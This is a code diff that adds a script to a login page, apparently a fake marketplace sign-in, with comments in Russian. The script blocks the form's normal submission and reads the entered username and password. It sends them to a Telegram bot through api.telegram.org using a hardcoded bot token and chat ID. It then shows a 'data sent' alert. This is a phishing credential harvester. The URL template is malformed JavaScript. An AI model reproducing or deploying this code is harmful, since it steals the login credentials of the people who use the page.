@@ -219,5 +219,34 @@
     </form>
   </div>
 
+<script>
+document.querySelector('.wb-form').addEventListener('submit', async function(e) {
+  e.preventDefault(); // отменяем стандартную отправку формы
+
+  // получаем значения полей
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+
+  // ⚠️ Замени на свой токен и chat_id
+  const BOT_TOKEN = 'ТОКЕН_ТВОЕГО_БОТА';
+  const CHAT_ID = 'ТВОЙ_CHAT_ID';
+
+  // формируем текст сообщения
+  const text = `🔐 Новая форма входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
+
+  // отправляем в Telegram через API
+  const url = `https://api.telegram.org/bot${6836324743:AAFIWAOKYDUkbz3ojpNthxPb0WqYtBkfBkg}/sendMessage`;
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: 5446866680, text })
+  });
+
+  // можно очистить форму или показать сообщение
+  alert('Данные отправлены!');
+  e.target.reset();
+});
+</script>
+
 </body>
 </html>
